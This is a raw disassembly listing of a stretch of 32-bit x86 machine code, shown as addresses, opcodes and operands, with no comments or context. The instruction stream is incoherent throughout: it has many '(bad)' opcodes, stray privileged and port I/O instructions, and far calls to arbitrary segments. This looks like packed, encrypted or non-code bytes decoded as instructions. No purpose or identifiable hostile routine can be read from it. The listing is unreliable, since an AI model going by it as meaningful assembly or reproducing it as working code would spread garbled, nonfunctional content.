  40709b:	add    BYTE PTR [esi-0x65a20cae],bh
  4070a1:	sti    
  4070a2:	pop    ss
  4070a3:	(bad)  
  4070a4:	aad    0x96
  4070a6:	pop    es
  4070a7:	(bad)  
  4070a8:	mov    eax,0xf8354cfe
  4070ad:	leave  
  4070ae:	mov    ebx,0x589c0581
  4070b3:	lahf   
  4070b4:	inc    ebp
  4070b5:	div    DWORD PTR es:[ebx]
  4070b8:	popf   
  4070b9:	loopne 0x4070f8
  4070bb:	xchg   edx,eax
  4070bc:	repnz idiv DWORD PTR [edi]
  4070bf:	cmp    ebx,DWORD PTR [edx-0x45418a23]
  4070c5:	mov    eax,db1
  4070c8:	adc    al,0x42
  4070ca:	jg     0x4070c4
  4070cc:	fidiv  DWORD PTR [ebp+0x26]
  4070cf:	push   eax
  4070d0:	sub    esi,DWORD PTR [edx-0x6187d9f2]
  4070d6:	leave  
  4070d7:	mov    dl,dh
  4070d9:	mov    eax,ds:0x9e9090f1
  4070de:	or     dl,BYTE PTR [edx-0x5b]
  4070e1:	xchg   edi,eax
  4070e2:	sbb    bl,BYTE PTR [edx+0x35212f00]
  4070e8:	sahf   
  4070e9:	cmp    eax,0xa636c711
  4070ee:	dec    eax
  4070ef:	or     al,BYTE PTR [ebp+ecx*1+0x11]
  4070f3:	or     al,0xb2
  4070f5:	xchg   BYTE PTR es:[eax+edx*1+0x3b],dl
  4070fa:	mov    al,BYTE PTR [edx+0xe]
  4070fd:	pop    es
  4070fe:	call   0x12b3:0x36ca9703
  407105:	pop    ecx
  407106:	lds    edi,FWORD PTR [edi+0x73763885]
  40710c:	push   es
  40710d:	add    bh,cl
  40710f:	pop    edx
  407110:	addr16 call 0x4e89:0x42cd8316
  407118:	or     al,0x10
  40711a:	pop    esi
  40711b:	rol    DWORD PTR [ecx],cl
  40711d:	push   cs
  40711e:	outs   dx,BYTE PTR ds:[esi]
  40711f:	xchg   esi,eax
  407120:	sub    eax,0x5e0a19f9
  407125:	mov    BYTE PTR [edx-0x6b],cl
  407128:	test   DWORD PTR [edi+0x50c0410e],ebx
  40712e:	js     0x40714a
  407130:	xor    esi,DWORD PTR [edi]
  407132:	cmp    ch,BYTE PTR [esp+edx*2+0x2e17e0dd]
  407139:	dec    edx
  40713a:	fidiv  DWORD PTR [edx+0x76]
  40713d:	adc    DWORD PTR [ecx+0x386c1805],edi
  407143:	loope  0x4071a9
  407145:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407146:	mov    edx,0xe7d4d26c
  40714b:	scas   eax,DWORD PTR es:[edi]
  40714c:	and    ah,0xf5
  40714f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407150:	lods   al,BYTE PTR ds:[esi]
  407151:	cmp    eax,0x6900de4
  407156:	mov    al,ds:0x7c4a2e3a
  40715b:	dec    DWORD PTR [esi+0x4e6e6cc7]
  407161:	and    BYTE PTR [eax-0x20],al
  407164:	push   edi
  407165:	fmul   QWORD PTR [esi-0x65]
  407168:	jmp    0x40716e
  40716a:	test   al,0x9
  40716c:	mov    bl,BYTE PTR [eax-0x2d]
  40716f:	lahf   
  407170:	in     al,dx
  407171:	stos   BYTE PTR es:[edi],al
  407172:	pusha  
  407173:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407174:	sbb    esp,edx
  407176:	and    ah,BYTE PTR [edx]
  407178:	inc    ebp
  407179:	mov    ah,al
  40717b:	xchg   edx,eax
  40717c:	call   0xcaf151e3
  407181:	or     DWORD PTR [edi],esp
  407183:	ins    DWORD PTR es:[edi],dx
  407184:	cmp    ah,BYTE PTR [eax-0x7d]
  407187:	inc    edx
  407188:	dec    edi
  407189:	mov    ah,al
  40718b:	in     al,0x7d
  40718d:	mov    al,ds:0xce5d4f56
  407192:	sub    DWORD PTR [esi],edx
  407194:	mov    ch,0xa8
  407196:	xchg   edi,eax
  407197:	imul   eax,DWORD PTR ds:0x45507b3f,0xfffffffd
  40719e:	add    dl,BYTE PTR [edi-0x2e]
  4071a1:	sub    esp,DWORD PTR [edi]
  4071a3:	push   ds
  4071a4:	jmp    0x407169
  4071a6:	jne    0x407223
  4071a8:	adc    DWORD PTR [ebx],edi
  4071aa:	push   ecx
  4071ab:	lahf   
  4071ac:	data16 sbb bl,dh
  4071af:	into   
  4071b0:	xchg   DWORD PTR [edi],ecx
  4071b2:	or     eax,0x43f0d11b
  4071b7:	ror    BYTE PTR [eax+ebx*1],cl
  4071ba:	push   ebp
  4071bb:	sub    DWORD PTR ds:0xa6dbea2e,0x17936422
  4071c5:	pop    ss
  4071c6:	or     DWORD PTR [eax],0xfffffffb
  4071c9:	jmp    0x4071da
  4071cb:	mov    cl,0xbb
  4071cd:	popa   
  4071ce:	dec    edi
  4071cf:	hlt    
  4071d0:	repnz sti 
  4071d2:	aas    
  4071d3:	cmp    eax,0xb7a7637d
  4071d8:	xchg   DWORD PTR [ecx-0x185bd883],edi
  4071de:	popf   
  4071df:	sahf   
  4071e0:	or     DWORD PTR [ebp+eax*2-0x17ca52fd],edx
  4071e7:	mov    ebx,DWORD PTR [edx-0x25]
  4071ea:	push   esi
  4071eb:	test   BYTE PTR [ebx+edx*1],ch
  4071ee:	cmp    DWORD PTR [ecx-0x7f],edi
  4071f1:	loop   0x4071c0
  4071f3:	inc    ebp
  4071f4:	fmul   st,st(4)
  4071f6:	push   ecx
  4071f7:	dec    esi
  4071f8:	inc    esi
  4071f9:	jbe    0x4071e3
  4071fb:	fisub  WORD PTR [ebx]
  4071fd:	cmp    al,0x24
  4071ff:	je     0x407270
  407201:	fmulp  st(4),st
  407203:	sahf   
  407204:	mov    cl,dl
  407206:	xchg   edi,eax
  407207:	xchg   ecx,eax
  407208:	xchg   ebp,eax
  407209:	aad    0x37
  40720b:	rcl    BYTE PTR [eax-0x3b00e86e],0xcc
  407212:	fwait
  407213:	std    
  407214:	shr    BYTE PTR [ebx],1
  407216:	(bad)  
  407217:	adc    BYTE PTR [ecx+0x6e],ah
  40721a:	outs   dx,DWORD PTR ds:[esi]
  40721b:	cmp    DWORD PTR [ecx],ebp
  40721d:	out    dx,eax
  40721e:	out    dx,eax
  40721f:	or     al,0xc9
  407221:	dec    edi
  407222:	dec    eax
  407223:	pop    ebx
  407224:	cli    
  407225:	dec    eax
  407226:	cwde   
  407227:	pop    esp
  407228:	pop    esi
  407229:	data16 or BYTE PTR [ecx],0xac
  40722d:	mov    DWORD PTR [edi+0x17491ebd],ecx
  407233:	mov    al,0x9c
  407235:	imul   DWORD PTR [edi-0x4fbddedd]
  40723b:	cmp    eax,0x20086238
  407240:	test   al,0x9a
  407242:	push   cs
  407243:	data16 fwait
  407245:	les    edx,FWORD PTR [edi-0x59]
  407248:	jns    0x4072ab
  40724a:	xlat   BYTE PTR ds:[ebx]
  40724b:	jne    0x407259
  40724d:	or     al,0xf1
  40724f:	inc    edi
  407250:	adc    al,BYTE PTR ds:0x91c99b50
  407256:	int    0x36
  407258:	loopne 0x4072d0
  40725a:	loop   0x407249
  40725c:	mov    DWORD PTR [ecx],edi
  40725e:	cmp    DWORD PTR [edi],edx
  407260:	shl    DWORD PTR [edi-0x35],cl
  407263:	cmp    dl,ah
  407265:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407266:	push   es
  407267:	imul   edi,DWORD PTR [ecx],0xffffffb2
  40726a:	call   FWORD PTR [edx]
  40726c:	(bad)  
  40726d:	repnz sub eax,0x6767c1d9
  407273:	pusha  
  407274:	(bad)  
  407275:	fs lock mov edx,0xadd8ee7a
  40727c:	mov    cl,0x25
  40727e:	push   cs
  40727f:	inc    BYTE PTR [ebp-0x50]
  407282:	out    0xd7,al
  407284:	repz test eax,0x2f54136c
  40728a:	add    eax,0x61e47a59
  40728f:	pop    edi
  407290:	retf   
  407291:	dec    eax
  407292:	outs   dx,DWORD PTR ds:[esi]
  407293:	loop   0x407235
  407295:	sub    al,0xf6
  407297:	iret   
  407298:	or     al,0x8a
  40729a:	ret    
  40729b:	and    al,0x3d
  40729d:	push   esp
  40729e:	sbb    dl,al
  4072a0:	sbb    BYTE PTR [edx-0x31c1e95f],dh
  4072a6:	cli    
  4072a7:	and    BYTE PTR [edi-0xd],cl
  4072aa:	(bad)  
  4072ab:	cwde   
  4072ac:	jge    0x407268
  4072ae:	das    
  4072af:	mov    esp,0xf04acf96
  4072b4:	test   al,0x6c
  4072b6:	ret    
  4072b7:	jge    0x4072c5
  4072b9:	cmp    DWORD PTR [ebx-0x154ee3cf],edx
  4072bf:	or     al,0xb1
  4072c1:	dec    eax
  4072c2:	stc    
  4072c3:	xor    BYTE PTR [esi+0x3d4a38e7],al
  4072c9:	test   DWORD PTR [esi+edx*4],0x3c7300c9
  4072d0:	push   edi
  4072d1:	clc    
  4072d2:	jle    0x407258
  4072d4:	jge    0x4072d1
  4072d6:	pop    ebx
  4072d7:	mov    dl,0x30
  4072d9:	push   cs
  4072da:	push   ecx
  4072db:	out    0xae,eax
  4072dd:	mov    esi,0xb433ee51
  4072e2:	clc    
  4072e3:	jecxz  0x4072e5
  4072e5:	(bad)  
  4072e7:	add    DWORD PTR [ebx],eax
  4072e9:	cli    
  4072ea:	jge    0x407293
  4072ec:	mov    eax,ebx
  4072ee:	fidivr DWORD PTR [eax+eiz*4-0x2939599]
  4072f5:	in     eax,dx
  4072f6:	ret    0x26c8
  4072f9:	fisttp WORD PTR [edx+0x547ffd1f]
  4072ff:	leave  
  407300:	mov    dh,0xe0
  407302:	int    0x59
  407304:	xchg   DWORD PTR [edx],edx
  407306:	adc    eax,0xff3a47ef
  40730b:	js     0x4072ba
  40730d:	div    DWORD PTR [esi]
  40730f:	pop    edi
  407310:	bound  ecx,QWORD PTR [edx+0x35]
  407313:	icebp  
  407314:	mov    cs,WORD PTR [eax+0x4d]
  407317:	mov    edx,0xb7e6c73b
  40731c:	adc    cl,BYTE PTR fs:[edx]
  40731f:	out    0xc5,eax
  407321:	(bad)  
  407322:	push   ss
  407323:	inc    ecx
  407324:	mov    esi,0xb38dac3c
  407329:	jbe    0x407351
  40732b:	call   0xeb9b:0xd957f760
  407332:	or     al,0x4
  407334:	icebp  
  407335:	mov    cl,BYTE PTR [esi-0x2c02c443]
  40733b:	loop   0x4073ad
  40733d:	mov    cl,0xb2
  40733f:	loopne 0x4073a6
  407341:	cli    
  407342:	inc    edx
  407343:	jle    0x4073b8
  407345:	in     eax,0xd
  407347:	ins    DWORD PTR es:[edi],dx
  407348:	inc    esp
  407349:	adc    al,0x46
  40734b:	or     al,0xa1
  40734d:	out    dx,al
  40734e:	enter  0xae9a,0xd5
  407352:	xor    DWORD PTR [ecx-0x54],esi
  407355:	jp     0x407337
  407357:	scas   al,BYTE PTR es:[edi]
  407358:	push   ebx
  407359:	pop    ecx
  40735a:	shl    DWORD PTR [eax+0x5b],1
  40735d:	mov    dl,0xe9
  40735f:	sbb    al,0xac
  407361:	call   FWORD PTR [ebx]
  407363:	aas    
  407364:	jne    0x40733b
  407366:	repz mov al,ds:0xd10f777e
  40736c:	ins    DWORD PTR es:[edi],dx
  40736d:	dec    ebx
  40736e:	push   esi
  40736f:	neg    eax
  407371:	(bad)  
  407372:	stos   DWORD PTR es:[edi],eax
  407373:	dec    edx
  407374:	sbb    dl,dh
  407376:	fcom   QWORD PTR [eax]
  407378:	fcomp  QWORD PTR [eax]
  40737a:	ret    0x3eea
  40737d:	test   ebp,eax
  40737f:	ret    
  407380:	mov    ah,0xf6
  407382:	sahf   
  407383:	push   esp
  407384:	xchg   ebx,eax
  407385:	aaa    
  407386:	lods   eax,DWORD PTR ds:[esi]
  407387:	aaa    
  407388:	jno    0x40731b
  40738a:	sbb    BYTE PTR [esi+0xe05c9c0],0xc0
  407391:	cs mov esp,0x38c0bb93
  407397:	ret    0xef40
  40739a:	pop    ss
  40739b:	inc    ebx
  40739c:	sbb    ecx,edx
  40739e:	and    eax,0xc6f37b72
  4073a3:	mov    eax,0x8e2cc494
  4073a8:	cmc    
  4073a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073aa:	fnstenv [esi+0x5eb3c9be]
  4073b0:	mov    ebp,0xee4291d8
  4073b5:	add    BYTE PTR ds:0x27b18ff9,dl
  4073bb:	out    dx,eax
  4073bc:	rcl    eax,0xb4
  4073bf:	mov    ecx,DWORD PTR [eax+eax*2+0xdcdba76]
  4073c6:	mov    edx,0x90140916
  4073cb:	jp     0x407406
  4073cd:	pop    ds
  4073ce:	icebp  
  4073cf:	cld    
  4073d0:	fisubr WORD PTR [eax-0x18]
  4073d3:	call   FWORD PTR [eax+0x37]
  4073d6:	sub    eax,0x58fdf439
  4073db:	cmp    ebp,edi
  4073dd:	cmp    ah,cl
  4073df:	pop    ebx
  4073e0:	(bad)  
  4073e1:	enter  0x3822,0x77
  4073e5:	dec    esi
  4073e6:	(bad)  
  4073e7:	cld    
  4073e8:	rol    BYTE PTR [ebx-0x14],cl
  4073eb:	mov    ecx,0x11800608
  4073f0:	inc    esi
  4073f1:	lods   al,BYTE PTR ds:[esi]
  4073f2:	retf   0xc5eb
  4073f5:	stos   DWORD PTR es:[edi],eax
  4073f6:	sbb    esp,DWORD PTR [ebp-0x415f084e]
  4073fc:	xor    bh,BYTE PTR [edx]
  4073fe:	jl     0x407453
  407400:	out    0x75,al
  407402:	sbb    al,0xda
  407404:	repz mov ecx,0x124fed9
  40740a:	cmp    eax,0x1293d141
  40740f:	loop   0x407430
  407411:	or     BYTE PTR [ebx+0x66],ah
  407414:	mov    ds:0xc860e817,al
  40741a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40741b:	js     0x407417
  40741d:	sub    BYTE PTR [ecx+0x7d],dl
  407420:	adc    eax,0x211908ad
  407425:	or     eax,0x7112ecb2
  40742a:	fistp  DWORD PTR [esp+ebx*4+0x9]
  40742e:	fld    DWORD PTR [edx+edi*2+0x14905d15]
  407435:	es sbb ebx,ebx
  407438:	inc    edi
  407439:	jecxz  0x4073fe
  40743b:	stc    
  40743c:	sbb    al,BYTE PTR [edx-0x2933efba]
  407442:	fcom   DWORD PTR [edx-0x2e]
  407445:	pop    eax
  407446:	mov    ss,WORD PTR [edi-0x57]
  407449:	jge    0x4074ad
  40744b:	out    0xc2,al
  40744d:	pop    ebx
  40744e:	pop    es
  40744f:	and    eax,0x3356e146
  407454:	(bad)  
  407455:	add    eax,0xbeb65cf1
  40745a:	pop    DWORD PTR [ebp+eiz*8+0xd20e43]
  407461:	neg    DWORD PTR [eax-0x73a5dfde]
  407467:	and    DWORD PTR [ecx+0x482b68b9],eax
  40746d:	fstp   QWORD PTR [ebp+eiz*8-0x5ce7997a]
  407474:	cmp    al,0xa
  407476:	fwait
  407477:	mov    ebx,0x8e0ddec8
  40747c:	adc    BYTE PTR [ebp+0x28e7dc24],dl
  407482:	lahf   
  407483:	push   ebp
  407484:	lds    ebp,FWORD PTR [eax-0x79]
  407487:	mov    eax,0xf5639728
  40748c:	ins    BYTE PTR es:[edi],dx
  40748d:	test   BYTE PTR [esi],ch
  40748f:	nop
  407490:	or     esp,DWORD PTR [ecx]
  407492:	xlat   BYTE PTR ds:[ebx]
  407493:	pop    ebp
  407494:	add    eax,0xadc0178a
  407499:	sti    
  40749a:	ds add dh,dl
  40749d:	imul   esp,DWORD PTR [eax],0x68
  4074a0:	outs   dx,DWORD PTR ds:[esi]
  4074a1:	jo     0x407492
  4074a3:	cmc    
  4074a4:	pop    edx
  4074a5:	gs retf 
  4074a7:	rcl    DWORD PTR [esi+0x6e],1
  4074aa:	cdq    
  4074ab:	push   ebx
  4074ac:	mov    ds,WORD PTR [eax+0x70]
  4074af:	das    
  4074b0:	cld    
  4074b1:	jbe    0x40748c
  4074b3:	sbb    bh,BYTE PTR [edx-0x33598a40]
  4074b9:	nop
  4074ba:	and    esi,DWORD PTR [ecx-0x6c]
  4074bd:	stc    
  4074be:	mov    ebx,edi
  4074c0:	jbe    0x4074a5
  4074c2:	adc    eax,0xc0d63f04
  4074c7:	and    al,0xda
  4074c9:	les    edi,FWORD PTR [ecx]
  4074cb:	xor    edi,ebx
  4074cd:	das    
  4074ce:	adc    dl,BYTE PTR [edi-0x4d]
  4074d1:	ret    
  4074d2:	mov    cl,0xbc
  4074d4:	push   edx
  4074d5:	inc    edi
  4074d6:	gs leave 
  4074d8:	adc    eax,DWORD PTR cs:[ebp-0x1c73c23c]
  4074df:	and    al,BYTE PTR [eax+0x69c440b0]
  4074e5:	xor    DWORD PTR [ebx+ebx*2-0x6654ef20],esi
  4074ec:	lahf   
  4074ed:	stos   DWORD PTR es:[edi],eax
  4074ee:	ins    DWORD PTR es:[edi],dx
  4074ef:	mov    ebp,0x3b49937
  4074f4:	jae    0x4074fd
  4074f6:	fsub   DWORD PTR [eax]
  4074f8:	push   esi
  4074f9:	push   esi
  4074fa:	ja     0x40754c
  4074fc:	std    
  4074fd:	mov    WORD PTR [edi+0x41648e45],?
  407503:	popf   
  407504:	js     0x4074b9
  407506:	xor    al,0x11
  407508:	pusha  
  407509:	xor    BYTE PTR [ecx-0x3991e576],ah
  40750f:	xor    esp,esp
  407511:	enter  0xf736,0x3
  407515:	mov    dl,0x89
  407517:	dec    edx
  407518:	xor    DWORD PTR [edx-0x1e],esp
  40751b:	stos   BYTE PTR es:[edi],al
  40751c:	add    al,0x2e
  40751e:	xchg   esi,esi
  407520:	ss xor al,0x50
  407523:	cmp    cl,BYTE PTR [ecx]
  407525:	cmp    BYTE PTR [edi],ch
  407527:	stos   DWORD PTR es:[edi],eax
  407528:	add    edx,DWORD PTR [ebx+0x2c4ad0b]
  40752e:	aaa    
  40752f:	(bad)  
  407530:	mov    ebx,0x82ed2fbe
  407535:	in     eax,0x83
  407537:	push   cs
  407538:	aas    
  407539:	daa    
  40753a:	or     ebp,edx
  40753c:	test   eax,0xbc675691
  407541:	pop    edi
  407542:	mov    edx,0x7d08b97c
  407547:	adc    eax,0xee1decb5
  40754c:	adc    DWORD PTR [edi-0x381e41bf],esi
  407552:	nop
  407553:	inc    ebx
  407554:	mov    bl,cl
  407556:	xor    eax,0x20ce9f56
  40755b:	inc    esp
  40755c:	inc    esp
  40755d:	pop    esi
  40755e:	idiv   esi
  407560:	push   ss
  407561:	or     DWORD PTR [esi],eax
  407563:	ss cmp ebp,esp
  407566:	fist   WORD PTR [esi-0x6e]
  407569:	lods   al,BYTE PTR ds:[esi]
  40756a:	fist   DWORD PTR [eax-0x23]
  40756d:	jle    0x4075b6
  40756f:	aaa    
  407570:	out    0x12,eax
  407572:	outs   dx,DWORD PTR ds:[esi]
  407573:	sub    dl,BYTE PTR [ecx+edi*8]
  407576:	sbb    al,0x38
  407578:	or     ebx,eax
  40757a:	mov    ?,WORD PTR [ebx-0x43]
  40757d:	stc    
  40757e:	add    DWORD PTR [esi+0x1950966a],0x81c3fad2
  407588:	mov    WORD PTR [ecx-0x22],ax
  40758c:	jns    0x407543
  40758e:	or     al,0x6
  407590:	xchg   BYTE PTR [edx+0x7e92ec96],bl
  407596:	inc    eax
  407597:	mov    WORD PTR [esi+0x12],es
  40759a:	outs   dx,BYTE PTR ds:[esi]
  40759b:	cdq    
  40759c:	xor    al,0xe4
  40759e:	(bad)  
  40759f:	test   BYTE PTR [edi+esi*2-0x19],0x76
  4075a4:	rcl    DWORD PTR [ebx-0x5d],1
  4075a7:	push   0xffffffa0
  4075a9:	es (bad) 
  4075ab:	ror    DWORD PTR [ebx+0x7bb1dce7],1
  4075b1:	sahf   
  4075b2:	(bad)  
  4075b4:	add    dl,BYTE PTR [eax+0x3cedf6ac]
  4075ba:	jo     0x4075af
  4075bc:	jg     0x4075a2
  4075be:	inc    edi
  4075bf:	out    dx,al
  4075c0:	cdq    
  4075c1:	ret    
  4075c2:	retf   
  4075c3:	lods   al,BYTE PTR ds:[esi]
  4075c4:	pop    edi
  4075c5:	ds dec edi
  4075c7:	in     eax,dx
  4075c8:	lock or eax,0xdf948897
  4075ce:	mov    dh,ah
  4075d0:	sbb    ecx,DWORD PTR [eax-0x7a63fa48]
  4075d6:	fst    QWORD PTR [ecx+0x4a]
  4075d9:	lock pop edi
  4075db:	iret   
  4075dc:	(bad)  
  4075dd:	pusha  
  4075de:	imul   BYTE PTR [edx-0x6c0b1190]
  4075e4:	std    
  4075e5:	sub    al,0x62
  4075e7:	mov    bl,bl
  4075e9:	pop    eax
  4075ea:	(bad)  
  4075eb:	retf   
  4075ec:	in     al,dx
  4075ed:	retf   
  4075ee:	(bad)  
  4075f0:	mov    ?,WORD PTR [edx]
  4075f2:	add    edx,DWORD PTR [ecx+0xa740181]
  4075f8:	xchg   ecx,eax
  4075f9:	pop    eax
  4075fa:	(bad)
  4075fe:	das    
  4075ff:	lahf   
  407600:	nop
  407601:	mov    ebp,0xaab560c0
  407606:	leave  
  407607:	stc    
  407608:	push   ebx
  407609:	pop    esi
  40760a:	dec    eax
  40760b:	in     eax,0xf4
  40760d:	in     eax,dx
  40760e:	call   0x3229:0x4a7689b
  407615:	les    ecx,FWORD PTR [eax]
  407617:	test   al,0x6d
  407619:	fiadd  WORD PTR [ebp-0x1ea34f08]
  40761f:	pop    ss
  407620:	out    dx,al
  407621:	or     BYTE PTR es:[edi+0x2e],ah
  407625:	ins    BYTE PTR es:[edi],dx
  407626:	fdiv   st,st(0)
  407628:	jg     0x4075cf
  40762a:	xlat   BYTE PTR ds:[ebx]
  40762b:	scas   al,BYTE PTR es:[edi]
  40762c:	imul   ebx
  40762e:	cdq    
  40762f:	sub    al,0xed
  407631:	jmp    0x407664
  407633:	test   eax,0x2b3f1ecb
  407638:	dec    ecx
  407639:	xchg   esp,eax
  40763a:	adc    edx,eax
  40763c:	daa    
  40763d:	pop    ss
  40763e:	cld    
  40763f:	in     eax,0x47
  407641:	cmp    ecx,DWORD PTR [esi-0x2a477c17]
  407647:	mov    ebp,DWORD PTR [ebp+0x31ddcec4]
  40764d:	and    DWORD PTR [eax+0x7c4a46d8],0x70
  407654:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407655:	cmp    BYTE PTR [ebx-0x6afdc440],bh
  40765b:	cwde   
  40765c:	or     al,0xaf
  40765e:	or     ah,BYTE PTR [ebx+edx*2-0x6e]
  407662:	xor    al,cl
  407664:	outs   dx,BYTE PTR ds:[esi]
  407665:	or     BYTE PTR [esi+0x6c],dl
  407668:	xor    dh,BYTE PTR [ecx]
  40766a:	xchg   edi,eax
  40766b:	mov    eax,0x944d50b9
  407670:	stc    
  407671:	(bad)  
  407672:	lahf   
  407673:	mov    ds:0xdd1fe60,al
  407678:	jp     0x40767f
  40767a:	les    esp,FWORD PTR [ecx]
  40767c:	mov    edx,0x7c8a2c99
  407681:	mov    esp,0xe0117ac7
  407686:	mov    esp,0x62df577d
  40768b:	xchg   ebp,eax
  40768c:	call   0x3b984369
  407691:	inc    edx
  407692:	jae    0x40769a
  407694:	mov    ch,0x72
  407696:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407697:	adc    ah,dl
  407699:	pop    edi
  40769a:	dec    edi
  40769b:	mov    cl,BYTE PTR [ecx+0x41b1c093]
  4076a1:	test   ebx,0xc9d00454
  4076a7:	inc    ebx
  4076a8:	and    BYTE PTR [ecx],ah
  4076aa:	jno    0x407650
  4076ac:	test   al,0x54
  4076ae:	adc    ebp,edi
  4076b0:	jae    0x40765c
  4076b2:	mov    bl,0xd4
  4076b4:	fstp   QWORD PTR [ecx+eax*2-0x5fa3fe26]
  4076bb:	fs jp  0x407738
  4076be:	mov    bl,0x58
  4076c0:	add    ebx,DWORD PTR [ecx]
  4076c2:	sub    al,0xfe
  4076c4:	leave  
  4076c5:	into   
  4076c6:	jns    0x4076e9
  4076c8:	mov    ebx,0xebc2f0cb
  4076cd:	cmp    DWORD PTR [ebp+0xe],ecx
  4076d0:	fwait
  4076d1:	sti    
  4076d2:	js     0x407714
  4076d4:	and    dl,BYTE PTR [ebp+0x16]
  4076d7:	in     eax,0x84
  4076d9:	(bad)  
  4076da:	lods   al,BYTE PTR ds:[esi]
  4076db:	aas    
  4076dc:	(bad)  
  4076dd:	hlt    
  4076de:	gs pop ebx
  4076e0:	sbb    edi,DWORD PTR [edx-0x712d4dda]
  4076e6:	mov    cl,0xbb
  4076e8:	sbb    eax,0x57e69bf9
  4076ed:	xchg   edx,eax
  4076ee:	lock jmp 0xe0d30456
  4076f4:	or     ecx,esp
  4076f6:	out    dx,al
  4076f7:	repz xchg ch,bl
  4076fa:	out    dx,al
  4076fb:	push   ebx
  4076fc:	pop    edx
  4076fd:	inc    esi
  4076fe:	cli    
  4076ff:	jecxz  0x407703
  407701:	ss push ds
  407703:	(bad)  
  407704:	stos   DWORD PTR es:[edi],eax
  407705:	dec    esp
  407706:	mov    dh,0x1c
  407708:	cmp    edi,edx
  40770a:	gs gs jno 0x4076d4
  40770e:	pop    eax
  40770f:	pusha  
  407710:	nop
  407711:	and    bh,ah
  407713:	ss sbb eax,0x99fcbf3
  407719:	into   
  40771a:	hlt    
  40771b:	mov    edx,0x30d5ae50
  407720:	(bad)  
  407722:	ror    DWORD PTR [esi-0x34],1
  407725:	(bad)  
  407727:	mov    al,BYTE PTR [eax+ebp*1-0x6e]
  40772b:	call   0x718d:0x250716d4
  407732:	call   0x3f93:0x9f930e4c
  407739:	sti    
  40773a:	ret    
  40773b:	leavew 
  40773d:	test   eax,0x4189bb68
  407742:	fnstsw WORD PTR [ecx+0xda342a7]
  407748:	jae    0x4077b5
  40774a:	les    edx,FWORD PTR [edi]
  40774c:	push   cs
  40774d:	xlat   BYTE PTR ds:[ebx]
  40774e:	in     al,dx
  40774f:	cli    
  407750:	jbe    0x4077be
  407752:	aad    0x65
  407754:	inc    edi
  407755:	mov    ch,0x33
  407757:	mov    edi,0x9e87cf5c
  40775c:	jnp    0x4077dc
  40775e:	sbb    ebp,DWORD PTR [ebx-0x6723a452]
  407764:	fwait
  407765:	xor    edx,DWORD PTR [edi-0x7a49588d]
  40776b:	fs xchg esp,eax
  40776d:	inc    esp
  40776e:	int3   
  40776f:	(bad)  
  407771:	pop    edi
  407772:	out    dx,eax
  407773:	sub    al,dl
  407775:	data16 lods al,BYTE PTR ds:[esi]
  407777:	neg    BYTE PTR [ebp+0x40]
  40777a:	fsub   st,st(2)
  40777c:	aas    
  40777d:	fldcw  WORD PTR [edx+0x9]
  407780:	dec    eax
  407781:	dec    ebp
  407782:	fidivr DWORD PTR [edx-0x9ba0834]
  407788:	and    al,0xde
  40778a:	outs   dx,BYTE PTR ds:[esi]
  40778b:	fcmovne st,st(4)
  40778d:	lahf   
  40778e:	loopne 0x4077a6
  407790:	sar    BYTE PTR [edi+0xe],0x34
  407794:	retf   
  407795:	std    
  407796:	mov    eax,ds:0x1ec22b59
  40779b:	jbe    0x407796
  40779d:	call   0xf6b681ae
  4077a2:	int3   
  4077a3:	sub    eax,0x7937e29e
  4077a8:	sub    ch,BYTE PTR [edx-0xa]
  4077ab:	adc    eax,0xe0eb2662
  4077b0:	push   ecx
  4077b1:	jge    0x407788
  4077b3:	dec    eax
  4077b4:	(bad)
  4077b9:	repnz cdq 
  4077bb:	int3   
  4077bc:	pop    ss
  4077bd:	inc    ebx
  4077be:	pop    ss
  4077bf:	pop    ebx
  4077c0:	mov    cs,WORD PTR [edx+0x39504a07]
  4077c6:	jge    0x4077ac
  4077c8:	(bad)  
  4077c9:	cmp    al,0xea
  4077cb:	pop    ecx
  4077cc:	in     al,dx
  4077cd:	loop   0x4077b8
  4077cf:	popa   
  4077d0:	mov    eax,ds:0x810176ba
  4077d5:	inc    eax
  4077d6:	cmp    DWORD PTR [ecx],ebx
  4077d8:	out    0x9f,eax
  4077da:	lods   al,BYTE PTR ds:[esi]
  4077db:	imul   eax,DWORD PTR [ecx+0x16],0x8
  4077df:	daa    
  4077e0:	sbb    ebp,DWORD PTR [edx]
  4077e2:	nop
  4077e3:	repnz dec esp
  4077e5:	ds mov ah,0x16
  4077e8:	mov    dl,0x63
  4077ea:	sbb    cl,dh
  4077ec:	(bad)
  4077f0:	fistp  DWORD PTR [ecx]
  4077f2:	sub    edi,DWORD PTR [eax-0x57705b7a]
  4077f8:	(bad)  
  4077f9:	lahf   
  4077fa:	cmp    ecx,esi
  4077fc:	sub    ecx,DWORD PTR [edx+0x51]
  4077ff:	pop    ds
  407800:	mov    cl,0x40
  407802:	mov    ecx,0xfc2af9ce
  407807:	hlt    
  407808:	in     eax,dx
  407809:	pop    ebx
  40780a:	xor    BYTE PTR [ebx-0x1f],cl
  40780d:	adc    BYTE PTR ds:0x5b88703,bh
  407813:	sbb    BYTE PTR [eax+eiz*8],bl
  407816:	add    BYTE PTR [ecx+0x31],bl
  407819:	shl    DWORD PTR [ebx+edx*8],1
  40781c:	rcr    bh,cl
  40781e:	ror    ch,0xcf
  407821:	aad    0x9d
  407823:	pusha  
  407824:	jmp    0x4077de
  407826:	xor    BYTE PTR [ebx+0x22b9bbd9],cl
  40782c:	sub    BYTE PTR [ebp+0x3737938f],cl
  407832:	leave  
  407833:	sahf   
  407834:	cmp    BYTE PTR [ebx],dh
  407836:	test   BYTE PTR [edx+0x4f],bh
  407839:	mov    ds:0x10a9b944,al
  40783e:	cmp    ch,al
  407840:	lods   eax,DWORD PTR ds:[esi]
  407841:	ss loopne 0x407836
  407844:	in     al,dx
  407845:	sbb    DWORD PTR [eax-0x35],ebp
  407848:	and    ebp,DWORD PTR [ebp+edi*1+0x273657de]
  40784f:	xchg   edi,eax
  407850:	jecxz  0x40780d
  407852:	adc    DWORD PTR [ecx],edi
  407854:	stc    
  407855:	sahf   
  407856:	and    bl,BYTE PTR [edx]
  407858:	sbb    DWORD PTR [eax+0x7b194337],0x4c
  40785f:	xor    eax,0x745f64e4
  407864:	xchg   esp,eax
